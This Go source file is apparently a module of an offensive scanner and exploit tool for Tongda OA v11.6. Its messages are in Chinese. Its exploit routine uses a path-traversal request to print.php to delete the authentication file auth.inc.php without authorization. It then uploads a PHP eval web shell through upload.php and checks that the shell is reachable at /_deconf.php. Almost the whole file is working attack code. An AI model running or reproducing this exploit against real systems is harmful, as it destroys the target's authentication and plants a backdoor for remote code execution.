package vulners

import (
	"fmt"
	"strings"

	"github.com/fatih/color"
)

type Td10 struct {
}

func (c *Td10) Scan(targetUrl string) {
	vulnerable, err := Td10scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td10] 存在v11.6 print.php未授权删除auth.inc.php导致RCE")
	} else {
		color.White("[Td10] 不存在v11.6 print.php未授权删除auth.inc.php导致RCE")
	}
}

func (*Td10) Exploit(targetUrl string) {
	runResult, err := Td10runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td10scancore(targetUrl string) (bool, error) {
	url := "/module/appbuilder/assets/print.php"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "请确保本机安装了office") {
		return true, nil
	} else {
		return false, nil
	}
}

func Td10runcore(targetUrl string) (string, error) {
	url := "/module/appbuilder/assets/print.php"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "请确保本机安装了office") {
		var chk string
		fmt.Println("[!]警告！使用本漏洞将会导致OA的认证文件被删除，造成运行异常，阁下在知道该后果的情况下，是否仍要利用该漏洞？(yes/no)")
		fmt.Scan(&chk)
		if chk == "yes" {
			url2 := "/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
			resp2, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				Get(targetUrl + url2)
			if err != nil {
				return "", err
			}
			resContent2 := resp2.String()
			if strings.Contains(resContent2, "请确保本机安装了office") {
				url3 := "/inc/auth.inc.php"
				resp3, err := baseClient.
					NewRequest().
					SetHeader("Content-Type", "application/x-www-form-urlencoded").
					Get(targetUrl + url3)
				if err != nil {
					return "", err
				}
				if resp3.StatusCode != 200 {
					url4 := "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./"
					data := `--59db9a76bd2b8115e2f17b93663c27e3
Content-Disposition: form-data; name="FILE1"; filename="deconf.php"

<?php eval($_POST['pass']);?>
--59db9a76bd2b8115e2f17b93663c27e3--`
					resp4, err := baseClient.
						NewRequest().
						SetHeaders(map[string]string{
							"Content-Type": "multipart/form-data; boundary=59db9a76bd2b8115e2f17b93663c27e3",
						}).
						SetBodyString(data).
						Post(targetUrl + url4)
					if err != nil {
						return "", nil
					}
					resContent4 := resp4.String()
					if strings.Contains(resContent4, "/../../../_deconf.php") {
						url5 := "/_deconf.php"
						resp5, err := baseClient.
							NewRequest().
							Get(targetUrl + url5)
						if err != nil {
							return "", nil
						}
						if resp5.StatusCode == 200 {
							return "[Td10] 存在v11.6 print.php未授权删除auth.inc.php导致RCE，漏洞利用成功！\nWebShell地址：\n/_deconf.php", nil
						} else {
							return "", nil
						}
					} else {
						return "", nil
					}
				} else {
					return "", nil
				}
			} else {
				return "", nil
			}

		} else if chk == "no" {
			return "用户已停止利用", nil
		} else {
			return "", nil
		}

	} else {
		return "", nil
	}
}
